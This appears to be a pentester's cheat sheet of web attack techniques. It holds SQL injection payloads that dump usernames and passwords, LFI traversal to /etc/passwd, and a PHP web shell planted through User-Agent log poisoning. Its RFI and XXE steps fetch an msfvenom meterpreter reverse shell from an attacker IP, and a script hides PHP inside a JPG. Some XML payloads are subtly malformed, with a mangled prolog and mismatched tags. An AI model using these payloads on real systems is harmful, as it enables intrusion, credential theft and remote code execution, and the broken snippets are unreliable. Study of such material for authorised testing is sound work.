- ## SQLI
 
   -   **injecting a single quote can cause weird behavior of app indicating possible injection point**
   -   **Try all get(through url),post(burp) parameters and inject in headers also(burp)**
   -   **when testing boolean sqli,a true condition shows as normal while false causes app to malfunction**
   -   ****
      
     ### basic boolean sqli

       web app uses select example,example2 from table_name where id=somevalue . We add our payload to make it a boolean condition

       This query dump all the information which is queried and we only check comdition with the parameter to make statement true

>     ' or 1=1--        

     
     ### basic union sqli

       Union based sqli doesnt ignore the app sql query as there is no boolean condition so application query is executed alongside our crafted query

      Union joins different sql queries together

      **We dont know that how many attributes is the application asking in the query which we manipulate**
      
      **to tackle that we can use following payload**
      ***'union select null,null;***   we can keep increasing amount of nulls in our query and at which number web app dont give any error,thats the right amount of queries
      **We can also do this by using ORDER By 1,order by 2(keep increasing orders until you get right amount of queiries)**

>     ' union select username,password from table_name where 1=1;

     #### local database username

>      we can see the database user using user() function ; 
>      Query is   ' union select user();-- -

- ## LFI

https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225

LFI occurs when a parameter fetch a resource from server and we can instead make it fetch our requried files.

when seeing for lfi try pre appending a / and then traverse to required file as sometimes server requires it

NOtice how we preappended a / with etcpasswd location

> http://example.com/?id=/../../../../../etc/passwd

If server requires a specific keyword then we can add it first and then traverse to required location

#### PHP WRAPPERS

Sometimes server preappends .php extension with resources being fetched by server ,so we can make use of  php filter
wrapper which sends required eqest as base64 and recieves it in base64 .if we have to get source of index.php  we
can get it by using this filter  and giving the resource parameter as index. Index source can give us more info about structure
of blacklisting and server and then we can further craft our payloads as we desire

- when normal lfi doesnt return output,then we can use this and we will get our output in base64.

> http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index

#### Apache log poisining
 
  https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

- In this attack we try to access the apache logs through lfi and then pass a web shell in user agent header in request
which can give us rce

- Possible injection locations

1. /var/log/apache2/access.log
2. /var/log/apache/access.log
3. /var/log/apache2/error.log
4. /var/log/apache/error.log
5. /usr/local/apache/log/error_log
6. /usr/local/apache2/log/error_log
7. /var/log/nginx/access.log
8. /var/log/nginx/error.log
9. /var/log/httpd/error_log

Use this command in useragent header

> <?php system($_GET['c']); ?>

NOw we will add the c paramter in url and execute commands

#### Self environ LFI TO RCE

we can navigate to /proc/self/environ and pass php shell in user agent header just like log poisoning

if we can access apache logs then we can get a rce via user agent header.

1. get the lfi apache logs and use burp to intercept

2. Now add a php parameter shell   <?php system($_GET['c']); ?> to user agent header and forward it

3. 	NOw access that parameter and execute commands as www-data


### RFI

1. Use the following shell in rfi and host a server in the directory

we use .txt format because sometimes server executes php on our machine isntead of victim

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

2. Now go to the url and include your webserver and file alongside it

> http://site.com?example.php=http://10.4.30.255:80/shell.txt

3. Listen on msf handler with the php/meterpreter/reverse_tcp set



## XXE

we canot use whitespaces in this attack so either we can use the $IFS command instead of a space

#### THis is used to read local files on server

> **<!- - ?xml version="1.0" ?- ->**

> **<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>**

> **<userinfo>**

> **<user>**

> **&ent;**

> **</user>**

> **</useinfo>**

WE can also use the above command and replace file with expect command

### REmote xxe


we can use this to upload a shell to server

instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell 
on our machine

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

<!- - ?xml version="1.0" ?- ->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://curl$IFS'10.4.30.255:80/shell.php'"> ]>
<userinfo>
<user>
&ent;
</user>
</useinfo>



## FIle uploads attacks

try different extensions like .pHp,.php5,.phtml etc 
there are diffferent extensions for single technology

mime-type shows us content type inside a file regardless of its extension,we can change this and trick the server

we can check a file content type by following

> file --mime-type filname.extension

sometimes try changing the content type in burp because servers verify sometimes from there

for example we can change the application/x-php to image/jpeg if server accepts images etc

#### Hidiing malcious code in an image

use a white jpg image

  #!/bin/python3
hideme=open('file.jpg','rb').read()
hideme+=open('test.php','rb').read()
open('hideme.php3','wb').write(hideme)
